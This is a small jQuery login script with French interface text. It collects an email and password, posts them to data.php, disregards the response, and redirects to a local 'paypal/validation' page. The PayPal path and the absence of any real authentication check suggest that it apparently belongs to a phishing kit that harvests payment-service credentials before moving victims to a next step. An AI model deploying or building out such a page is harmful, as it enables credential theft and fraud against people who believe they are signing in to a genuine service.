$(document).ready(function(){
    $('#text-start').fadeIn(2000)
    // alert("je suis chargé")
});

function login(){
    const email = $('#input').val()
    const pwd = $('#input2').val()

    if(email === '' || pwd === ''){
        $('#notif').html('<small>Un ou plusieurs champs sont vides<small>')
        return
    }

    $('.btn-connexion').html('<span role="status fs-5">Connexion en cours    </span>  <span class="spinner-grow spinner-grow-sm" aria-hidden="true"></span>');

    $.ajax({
        url: "data.php",
        method: "POST",
        data: {email, pwd},
        success: function(data) {
            // alert(data)
            setTimeout(() => {
                window.location = 'http://localhost/paypal/validation/';
            }, 2000);
        }
    })
}